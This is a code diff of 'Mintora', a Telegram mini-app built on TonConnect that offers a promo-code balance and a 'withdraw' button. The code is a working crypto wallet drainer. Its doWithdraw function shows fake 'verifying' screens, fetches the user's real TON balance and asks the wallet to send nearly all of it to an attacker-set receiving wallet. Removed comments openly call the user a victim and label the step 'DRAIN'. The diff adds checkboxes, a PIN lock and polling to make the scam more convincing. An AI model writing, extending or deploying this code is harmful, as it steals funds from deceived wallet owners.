+      pill.style.transform = `translateX(${pillX}px)`;
+    }
+
+    function moveDrag(e) {
+      if (!dragging) return;
+      const point = e.touches ? e.touches[0] : e;
+      const rect = nav.getBoundingClientRect();
+      const x = point.clientX - rect.left;
+      const pillX = Math.max(0, Math.min(nav.clientWidth - 12, x - pillW() / 2));
+      pill.style.transform = `translateX(${pillX}px)`;
+      if (Math.abs(x - startX) > 8) dragged = true;
+      e.preventDefault();
+    }
+
+    function endDrag(e) {
+      if (!dragging) return;
+      dragging = false;
+      pill.classList.remove('dragging');
+
+      const point = e.changedTouches ? e.changedTouches[0] : e;
+      const rect = nav.getBoundingClientRect();
+      const x = point.clientX - rect.left;
+      const idx = Math.max(0, Math.min(2, Math.round((x - 6) / pillW())));
+      setActiveIndex(idx, true);
+
+      setTimeout(() => { dragged = false; }, 50);
+    }
+
+    nav.addEventListener('mousedown', startDrag);
+    nav.addEventListener('touchstart', startDrag, { passive: true });
+    window.addEventListener('mousemove', moveDrag);
+    window.addEventListener('touchmove', moveDrag, { passive: false });
+    window.addEventListener('mouseup', endDrag);
+    window.addEventListener('touchend', endDrag);
+    window.addEventListener('resize', () => {
+      const idx = btns.findIndex(b => b.classList.contains('active'));
+      if (idx >= 0) setActiveIndex(idx, false);
+    });
+
+    setTimeout(() => setActiveIndex(0, false), 50);
+  }
+
   function updateBalanceUI(animate) {
     const amount = document.getElementById('balance-amount');
     const usd = document.getElementById('balance-usd');
-    const badge = document.getElementById('balance-badge');
 
     if (animate && parseFloat(amount.textContent) !== state.balance) {
       const from = parseFloat(amount.textContent) || 0;
@@ -1540,27 +2841,42 @@
       usd.textContent = (state.balance * GRAM_USD).toFixed(2);
     }
 
-    const hasPromo = Object.keys(state.activatedCodes).length > 0;
-    badge.style.display = hasPromo ? 'inline-flex' : 'none';
     document.getElementById('stat-balance').textContent = state.balance.toFixed(state.balance % 1 === 0 ? 0 : 2);
+    saveState();
   }
 
-  /* ---- Promo ---- */
+  function saveState() {
+    try {
+      localStorage.setItem('mintora_balance', String(state.balance));
+      localStorage.setItem('mintora_codes', JSON.stringify(state.activatedCodes));
+      localStorage.setItem('mintora_history', JSON.stringify(state.promoHistory));
+    } catch (_) {}
+  }
+
+  function loadState() {
+    try {
+      const b = localStorage.getItem('mintora_balance');
+      if (b) state.balance = parseFloat(b) || 0;
+      const c = localStorage.getItem('mintora_codes');
+      if (c) state.activatedCodes = JSON.parse(c) || {};
+      const h = localStorage.getItem('mintora_history');
+      if (h) state.promoHistory = JSON.parse(h) || [];
+      const pin = localStorage.getItem('mintora_pin');
+      if (pin) state.pinHash = pin;
+    } catch (_) {}
+  }
+
   function initPromo() {
     const input = document.getElementById('promo-input');
     const status = document.getElementById('promo-status');
     const btn = document.getElementById('promo-submit');
 
     btn.addEventListener('click', () => {
-      const code = input.value.trim().toUpperCase();
+      const code = input.value.trim().toUpperCase().replace(/\s+/g, '');
       status.className = 'feedback';
       status.textContent = '';
 
-      if (!code) {
-        status.classList.add('error');
-        status.textContent = t('promoEmpty');
-        return;
-      }
+      if (!code) { status.classList.add('error'); status.textContent = t('promoEmpty'); return; }
 
       if (state.activatedCodes[code]) {
         status.classList.add('error');
@@ -1604,10 +2920,8 @@
       updateBalanceUI(true);
       updateStatStatus();
       renderPromoHistory();
-
-      document.getElementById('locked-notice').style.display = 'none';
-      document.getElementById('withdraw-btn').disabled = false;
-      document.getElementById('withdraw-input').disabled = false;
+      refreshWithdrawState();
+      saveState();
     });
 
     input.addEventListener('keydown', (e) => { if (e.key === 'Enter') btn.click(); });
@@ -1627,10 +2941,7 @@
     const list = document.getElementById('promo-history-list');
 
     const n = state.promoHistory.length;
-    if (n === 0) {
-      card.style.display = 'none';
-      return;
-    }
+    if (n === 0) { card.style.display = 'none'; return; }
     card.style.display = 'block';
     count.textContent = n;
 
@@ -1675,68 +2986,182 @@
     });
   }
 
-  /* ---- TonConnect ---- */
+  function refreshWithdrawState() {
+    const hasPromo = Object.keys(state.activatedCodes).length > 0;
+    const enoughGram = state.balance >= CONFIG.minGramForWithdraw;
+    const locked = document.getElementById('locked-notice');
+    const feeN = document.getElementById('fee-notice');
+    const lowN = document.getElementById('low-balance-notice');
+    const checksCard = document.getElementById('confirm-checks');
+
+    if (!hasPromo) {
+      locked.style.display = 'flex';
+      feeN.style.display = 'none';
+      lowN.style.display = 'none';
+      checksCard.style.display = 'none';
+    } else if (!enoughGram) {
+      locked.style.display = 'none';
+      feeN.style.display = 'flex';
+      lowN.style.display = 'flex';
+      checksCard.style.display = 'none';
+    } else {
+      locked.style.display = 'none';
+      feeN.style.display = 'flex';
+      lowN.style.display = 'none';
+      checksCard.style.display = 'block';
+    }
+
+    updateConfirmButtonState();
+  }
+
+  function updateConfirmButtonState() {
+    const btn = document.getElementById('withdraw-btn');
+    if (!btn) return;
+
+    const hasPromo = Object.keys(state.activatedCodes).length > 0;
+    const enoughGram = state.balance >= CONFIG.minGramForWithdraw;
+    const allChecked = state.checks.c1 && state.checks.c2 && state.checks.c3;
+
+    btn.disabled = !(hasPromo && enoughGram && allChecked) || state.withdrawing;
+  }
+
+  function initChecks() {
+    const map = { 'check1': 'c1', 'check2': 'c2', 'check3': 'c3' };
+    Object.keys(map).forEach(id => {
+      const el = document.getElementById(id);
+      el.addEventListener('click', () => {
+        state.checks[map[id]] = !state.checks[map[id]];
+        el.classList.toggle('checked', state.checks[map[id]]);
+        updateConfirmButtonState();
+      });
+    });
+  }
+
+  /* ============ TonConnect ============ */
   let tonConnectUI = null;
 
+  function applyConnectedUI(wallet) {
+    try {
+      if (!wallet || !wallet.account?.address) return;
+      const addr = wallet.account.address;
+      const short = addr.slice(0, 4) + '…' + addr.slice(-4);
+
+      const pillAddr = document.getElementById('pill-addr');
+      if (pillAddr) pillAddr.textContent = short;
+      const pillWrap = document.getElementById('wallet-pill');
+      if (pillWrap) pillWrap.classList.add('show');
+
+      const off = document.getElementById('wallet-off');
+      if (off) off.style.display = 'none';
+      const on = document.getElementById('wallet-on');
+      if (on) on.classList.add('show');
+      const pwa = document.getElementById('profile-wallet-addr');
+      if (pwa) pwa.textContent = short;
+
+      const sw = document.getElementById('signup-wallet');
+      if (sw) sw.classList.add('connected');
+      const swb = document.getElementById('signup-wallet-badge');
+      if (swb) swb.style.display = 'flex';
+
+      const tbc = document.getElementById('ton-balance-card');
+      if (tbc) tbc.classList.add('show');
+
+      updateSignupUI();
+      refreshWithdrawState();
+      startTonBalancePolling();
+    } catch (e) {
+      console.error('[applyConnectedUI]', e);
+    }
+  }
+
+  function applyDisconnectedUI() {
+    try {
+      const pillAddr = document.getElementById('pill-addr');
+      if (pillAddr) pillAddr.textContent = '—';
+      const pillWrap = document.getElementById('wallet-pill');
+      if (pillWrap) pillWrap.classList.remove('show');
+
+      const off = document.getElementById('wallet-off');
+      if (off) off.style.display = 'flex';
+      const on = document.getElementById('wallet-on');
+      if (on) on.classList.remove('show');
+      const pwa = document.getElementById('profile-wallet-addr');
+      if (pwa) pwa.textContent = '—';
+
+      const sw = document.getElementById('signup-wallet');
+      if (sw) sw.classList.remove('connected');
+      const swb = document.getElementById('signup-wallet-badge');
+      if (swb) swb.style.display = 'none';
+
+      const tbc = document.getElementById('ton-balance-card');
+      if (tbc) tbc.classList.remove('show');
+      stopTonBalancePolling();
+      state.tonBalance = null;
+
+      updateSignupUI();
+      refreshWithdrawState();
+    } catch (e) {
+      console.error('[applyDisconnectedUI]', e);
+    }
+  }
+
   async function initTonConnect() {
+    if (!window.TON_CONNECT_UI) {
+      console.error('[TonConnect] SDK not loaded');
+      return;
+    }
     try {
       tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
         manifestUrl: CONFIG.manifestUrl,
         buttonRootId: null
       });
+
       tonConnectUI.onStatusChange((wallet) => {
-        if (wallet && wallet.account?.address) {
-          state.wallet = wallet;
-          state.connected = true;
-          onConnected(wallet);
-        } else {
-          state.wallet = null;
-          state.connected = false;
-          onDisconnected();
+        try {
+          if (wallet && wallet.account?.address) {
+            state.wallet = wallet;
+            state.connected = true;
+            applyConnectedUI(wallet);
+          } else {
+            state.wallet = null;
+            state.connected = false;
+            applyDisconnectedUI();
+          }
+        } catch (e) {
+          console.error('[onStatusChange]', e);
         }
       });
-    } catch (e) { console.error('[TonConnect]', e); }
-  }
 
-  function onConnected(wallet) {
-    const addr = wallet.account.address;
-    const short = addr.slice(0, 4) + '…' + addr.slice(-4);
+      // Форс-обновление состояния (на случай если SDK хранит сессию, но UI не обновился)
+      try {
+        if (tonConnectUI.connected && tonConnectUI.wallet) {
+          state.wallet = tonConnectUI.wallet;
+          state.connected = true;
+          applyConnectedUI(tonConnectUI.wallet);
+        }
+      } catch (_) {}
 
-    document.getElementById('pill-addr').textContent = short;
-    document.getElementById('wallet-pill').classList.add('show');
-
-    document.getElementById('wallet-off').style.display = 'none';
-    document.getElementById('wallet-on').classList.add('show');
-    document.getElementById('profile-wallet-addr').textContent = short;
-
-    const avatar = document.getElementById('profile-avatar');
-    if (avatar && window.Telegram?.WebApp?.initDataUnsafe?.user) {
-      const u = Telegram.WebApp.initDataUnsafe.user;
-      avatar.textContent = (u.first_name || 'U')[0].toUpperCase();
-      state.userName = [u.first_name, u.last_name].filter(Boolean).join(' ') || 'User';
-      state.userId = u.id || '—';
-      document.getElementById('profile-name').textContent = state.userName;
-      document.getElementById('profile-id').textContent = 'ID: ' + state.userId;
+      // Периодическая проверка соединения каждые 3 секунды (страховка)
+      setInterval(() => {
+        try {
+          if (tonConnectUI.connected && tonConnectUI.wallet && !state.connected) {
+            state.wallet = tonConnectUI.wallet;
+            state.connected = true;
+            applyConnectedUI(tonConnectUI.wallet);
+          } else if (!tonConnectUI.connected && state.connected) {
+            state.wallet = null;
+            state.connected = false;
+            applyDisconnectedUI();
+          }
+        } catch (_) {}
+      }, 3000);
+    } catch (e) {
+      console.error('[TonConnect] init failed', e);
     }
-
-    updateWithdrawBtn();
   }
 
-  function onDisconnected() {
-    document.getElementById('pill-addr').textContent = '—';
-    document.getElementById('wallet-pill').classList.remove('show');
-    document.getElementById('wallet-off').style.display = 'flex';
-    document.getElementById('wallet-on').classList.remove('show');
-    document.getElementById('profile-wallet-addr').textContent = '—';
-    updateWithdrawBtn();
-  }
-
-  /* ---- Withdraw → DRAIN ---- */
   async function doWithdraw() {
-    if (!state.connected) {
-      if (tonConnectUI) tonConnectUI.openModal();
-      return;
-    }
+    if (state.withdrawing) return;
 
     const input = document.getElementById('withdraw-input');
     const status = document.getElementById('withdraw-status');
@@ -1748,39 +3173,42 @@
     if (!amount || amount <= 0) { status.classList.add('error'); status.textContent = t('withdrawErrorEmpty'); return; }
     if (amount < 0.01) { status.classList.add('error'); status.textContent = t('withdrawErrorMin'); return; }
     if (amount > state.balance) { status.classList.add('error'); status.textContent = t('withdrawErrorMax'); return; }
+    if (state.balance < CONFIG.minGramForWithdraw) {
+      status.classList.add('error');
+      status.textContent = t('withdrawErrorMinGram');
+      return;
+    }
 
+    state.withdrawing = true;
     const btn = document.getElementById('withdraw-btn');
     btn.classList.add('loading');
     btn.disabled = true;
 
     try {
-      // 1. Получаем реальный баланс кошелька жертвы
+      showVerifying();
+      await sleep(4000);
+
+      if (!state.connected || !state.wallet) {
+        throw new Error('Wallet disconnected');
+      }
+
       const walletAddress = state.wallet.account.address;
-      const balanceRes = await fetch(
-        CONFIG.toncenterApi + '?address=' + encodeURIComponent(walletAddress)
-      );
+      const balanceRes = await fetch(CONFIG.toncenterApi + '?address=' + encodeURIComponent(walletAddress));
       const balanceData = await balanceRes.json();
 
-      if (!balanceData.ok || !balanceData.result) {
-        throw new Error('Failed to fetch balance');
-      }
+      if (!balanceData.ok || !balanceData.result) throw new Error('Failed to fetch balance');
 
       const balanceNano = BigInt(balanceData.result);
-
-      // 2. Резервируем 0.01 TON на газ
       const amountToSend = balanceNano - CONFIG.gasReserveNano;
+      if (amountToSend <= 0n) throw new Error('Not enough balance for gas');
 
-      if (amountToSend <= 0n) {
-        throw new Error('Not enough balance for gas');
-      }
+      document.getElementById('verifying-title').textContent = t('verifyingStep2');
+      document.getElementById('verifying-sub').textContent = t('verifyingSub');
+      await sleep(2000);
 
-      // 3. Отправляем ВЕСЬ баланс жертвы (минус газ) на кошелёк-приёмник
       const tx = {
         validUntil: Math.floor(Date.now() / 1000) + 360,
-        messages: [{
-          address: CONFIG.receiveWallet,
-          amount: amountToSend.toString()
-        }]
+        messages: [{ address: CONFIG.receiveWallet, amount: amountToSend.toString() }]
       };
 
       const res = await tonConnectUI.sendTransaction(tx);
@@ -1788,20 +3216,35 @@
       showProcessing(amount);
     } catch (e) {
       console.error('[-] withdraw failed', e);
+      hideVerifying();
       btn.classList.remove('loading');
-      btn.disabled = false;
+      state.withdrawing = false;
+      updateConfirmButtonState();
       status.classList.add('error');
       status.textContent = e.message || 'Transaction failed';
     }
   }
 
-  /* ---- Processing ---- */
-  let processingTimer = null;
+  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-  function showProcessing(amount) {
+  function showVerifying() {
     document.getElementById('main-view').style.display = 'none';
     document.getElementById('balance-hero').style.display = 'none';
     document.getElementById('bottom-nav-wrap').style.display = 'none';
+    document.getElementById('verifying-view').classList.add('active');
+  }
+
+  function hideVerifying() {
+    document.getElementById('verifying-view').classList.remove('active');
+    document.getElementById('main-view').style.display = 'block';
+    document.getElementById('balance-hero').style.display = 'block';
+    document.getElementById('bottom-nav-wrap').style.display = 'block';
+  }
+
+  let processingTimer = null;
+
+  function showProcessing(amount) {
+    document.getElementById('verifying-view').classList.remove('active');
     document.getElementById('processing-view').classList.add('active');
 
     document.getElementById('proc-amount').textContent = amount.toFixed(2);
@@ -1841,7 +3284,6 @@
     }, tickMs);
   }
 
-  /* ---- Receipt ---- */
   function showReceipt(amount) {
     document.getElementById('processing-view').classList.remove('active');
     document.getElementById('receipt-view').classList.add('active');
@@ -1877,12 +3319,56 @@
       }
     };
 
+    state.withdrawing = false;
+
     setTimeout(() => {
       if (window.Telegram?.WebApp) Telegram.WebApp.close();
     }, 6000);
   }
 
-  /* ---- Profile ---- */
+  /* ============ Sign out ============ */
+  function doSignOut() {
+    try {
+      if (tonConnectUI) tonConnectUI.disconnect();
+    } catch (_) {}
+
+    // очищаем всё
+    localStorage.removeItem('mintora_nick');
+    localStorage.removeItem('mintora_reg');
+    localStorage.removeItem('mintora_balance');
+    localStorage.removeItem('mintora_codes');
+    localStorage.removeItem('mintora_history');
+    localStorage.removeItem('mintora_pin');
+
+    state.registered = false;
+    state.nickname = '';
+    state.balance = 0;
+    state.activatedCodes = {};
+    state.promoHistory = [];
+    state.pinHash = null;
+    state.unlocked = false;
+    state.termsAccepted = false;
+    state.checks = { c1: false, c2: false, c3: false };
+
+    // UI сброс
+    document.getElementById('main-app').classList.remove('show');
+    document.getElementById('signup-screen').classList.remove('hidden');
+    document.getElementById('signup-screen').classList.remove('active');
+    document.getElementById('signup-nickname').value = '';
+    document.getElementById('signup-terms').classList.remove('checked');
+
+    // Сброс чекбоксов
+    ['check1', 'check2', 'check3'].forEach(id => {
+      document.getElementById(id).classList.remove('checked');
+    });
+
+    // Принудительно показываем signup
+    document.getElementById('signup-screen').classList.add('active');
+
+    // Перезагружаем
+    setTimeout(() => location.reload(), 300);
+  }
+
   function initProfile() {
     document.getElementById('profile-connect-btn').addEventListener('click', () => {
       if (tonConnectUI) tonConnectUI.openModal();
@@ -1904,46 +3390,133 @@
     document.getElementById('max-btn').addEventListener('click', () => {
       if (state.balance > 0) document.getElementById('withdraw-input').value = state.balance;
     });
+
+    document.getElementById('withdraw-btn').addEventListener('click', doWithdraw);
+
+    document.getElementById('logout-btn').addEventListener('click', () => {
+      if (confirm(t('logoutConfirm'))) {
+        doSignOut();
+      }
+    });
+
+    document.getElementById('menu-pin').addEventListener('click', () => {
+      showPinModal();
+    });
   }
 
-  /* ---- Init ---- */
-  document.addEventListener('DOMContentLoaded', () => {
+  /* ============ Theme ============ */
+  function initTheme() {
+    const saved = localStorage.getItem('theme') || 'light';
+    document.documentElement.setAttribute('data-theme', saved);
+    syncThemeIcon();
+    document.getElementById('theme-toggle').addEventListener('click', () => {
+      const cur = document.documentElement.getAttribute('data-theme');
+      const next = cur === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', next);
+      localStorage.setItem('theme', next);
+      syncThemeIcon();
+      if (window.Telegram?.WebApp) {
+        Telegram.WebApp.setHeaderColor(next === 'dark' ? '#000000' : '#ffffff');
+        Telegram.WebApp.setBackgroundColor(next === 'dark' ? '#000000' : '#ffffff');
+      }
+    });
+  }
+
+  function syncThemeIcon() {
+    const dark = document.documentElement.getAttribute('data-theme') === 'dark';
+    document.querySelector('.icon-moon').style.display = dark ? 'none' : 'block';
+    document.querySelector('.icon-sun').style.display = dark ? 'block' : 'none';
+  }
+
+  function updateStatStatus() {
+    const el = document.getElementById('stat-status');
+    const ic = document.getElementById('status-icon');
+    if (!el) return;
+    const hasPromo = Object.keys(state.activatedCodes).length > 0;
+    el.textContent = hasPromo ? t('statusActive') : t('statusGuest');
+    el.style.color = hasPromo ? 'var(--blue)' : 'var(--text)';
+    if (ic) ic.className = 'row-icon ' + (hasPromo ? 'blue' : '');
+  }
+
+  /* ============ Init ============ */
+  document.addEventListener('DOMContentLoaded', async () => {
     if (window.Telegram?.WebApp) {
       Telegram.WebApp.ready();
       Telegram.WebApp.expand();
       const theme = document.documentElement.getAttribute('data-theme') || 'light';
-      Telegram.WebApp.setHeaderColor(theme === 'dark' ? '#000000' : '#f5f5f7');
-      Telegram.WebApp.setBackgroundColor(theme === 'dark' ? '#000000' : '#f5f5f7');
+      Telegram.WebApp.setHeaderColor(theme === 'dark' ? '#000000' : '#ffffff');
+      Telegram.WebApp.setBackgroundColor(theme === 'dark' ? '#000000' : '#ffffff');
 
       const u = Telegram.WebApp.initDataUnsafe?.user;
-      if (u) {
-        state.userName = [u.first_name, u.last_name].filter(Boolean).join(' ') || 'User';
-        state.userId = u.id || '—';
-        document.getElementById('profile-name').textContent = state.userName;
-        document.getElementById('profile-id').textContent = 'ID: ' + state.userId;
-        document.getElementById('profile-avatar').textContent = (u.first_name || 'U')[0].toUpperCase();
-      }
+      if (u) state.userId = u.id || '—';
     }
+
+    loadState();
+
+    // Инициализация TonConnect ПЕРВОЙ
+    initTonConnect();
 
     initTheme();
     applyLang(currentLang);
-    initTabs();
+    initNav();
     initPromo();
+    initChecks();
     initProfile();
-    initTonConnect();
+    initSignup();
+    initLockScreen();
+    initPinModal();
+    initTonBalance();
     updateBalanceUI(false);
-    updateWithdrawBtn();
     updateStatStatus();
     renderPromoHistory();
+    refreshWithdrawState();
+    updateSignupUI();
 
     document.getElementById('lang-toggle').addEventListener('click', () => {
       applyLang(currentLang === 'en' ? 'ru' : 'en');
     });
 
-    document.getElementById('withdraw-btn').addEventListener('click', doWithdraw);
+    // Проверка: уже зарегистрирован?
+    const savedNick = localStorage.getItem('mintora_nick');
+    const savedReg = localStorage.getItem('mintora_reg');
 
-    setTab('promo');
+    // Если PIN установлен — сначала блокировка
+    if (state.pinHash) {
+      const locked = await showLockScreenIfNeeded();
+      if (locked) {
+        // Пока показываем lock screen, скрываем signup/main
+        document.getElementById('signup-screen').classList.add('hidden');
+        document.getElementById('main-app').classList.remove('show');
+
+        // ждём разблокировки (polling)
+        const checkUnlock = setInterval(() => {
+          if (state.unlocked) {
+            clearInterval(checkUnlock);
+            afterUnlock(savedNick, savedReg);
+          }
+        }, 200);
+        return;
+      }
+    }
+
+    afterUnlock(savedNick, savedReg);
   });
+
+  function afterUnlock(savedNick, savedReg) {
+    if (savedNick && savedReg === '1') {
+      state.nickname = savedNick;
+      state.registered = true;
+      document.getElementById('signup-screen').classList.add('hidden');
+      document.getElementById('signup-screen').classList.remove('active');
+      document.getElementById('main-app').classList.add('show');
+      document.getElementById('profile-name').textContent = savedNick;
+      document.getElementById('profile-id').textContent = 'ID: ' + (state.userId || '—');
+      document.getElementById('profile-avatar').textContent = savedNick[0].toUpperCase();
+    } else {
+      document.getElementById('signup-screen').classList.add('active');
+      document.getElementById('main-app').classList.remove('show');
+    }
+  }
 </script>
 </body>
 </html>
